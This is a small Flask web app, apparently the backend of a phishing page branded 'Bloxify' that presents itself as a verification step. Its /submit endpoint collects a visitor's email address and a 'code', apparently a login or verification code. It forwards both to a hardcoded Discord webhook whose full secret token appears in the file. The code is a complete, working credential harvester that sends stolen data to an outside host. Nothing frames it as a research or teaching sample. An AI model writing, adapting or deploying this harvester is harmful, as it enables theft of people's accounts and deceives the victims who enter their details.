from flask import Flask, render_template, request, jsonify
import requests

app = Flask(__name__)

WEBHOOK_URL = "https://discord.com/api/webhooks/1458185599688114309/X9TaZmu-EfBWAHNAv8DLennJgDm2QUYnCeIxxruMIdf9BLqj1CSxRsP09NxOBLr7Sm_u"

@app.route("/")
def home():
    return render_template("index.html")

@app.route("/submit", methods=["POST"])
def submit():
    data = request.json or {}

    payload = {
        "username": "Bloxify",
        "embeds": [{
            "title": "New Verification",
            "color": 0x2f3136,
            "fields": [
                {"name": "Email", "value": data.get("email", "N/A"), "inline": False},
                {"name": "Code", "value": data.get("code", "N/A"), "inline": False}
            ]
        }]
    }

    try:
        requests.post(WEBHOOK_URL, json=payload, timeout=5)
    except Exception as e:
        print("Webhook error:", e)

    return jsonify({"ok": True})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
